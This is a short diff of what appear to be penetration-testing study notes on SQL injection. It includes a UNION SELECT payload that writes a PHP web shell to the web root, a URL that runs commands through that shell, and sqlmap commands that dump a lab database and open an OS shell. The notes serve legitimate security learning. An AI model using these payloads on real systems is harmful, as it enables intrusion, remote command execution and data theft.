@@ -386,10 +386,9 @@
   - `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
   - `192xxx/tmp/webshell.php?cmd=id`  
 - Sqlmap (automating attack)
-  - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`: find injection point
-  - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`: dump entire database
-  - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`: os-shell with POST.txt
-  - 
+  - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`: find injection point  
+  - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`: dump entire database  
+  - `sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp`: os-shell with POST.txt  
     
 ### 11. Phishing Basics
 - broad phishing (mass attacks) and spear phishing (targeted attacks).
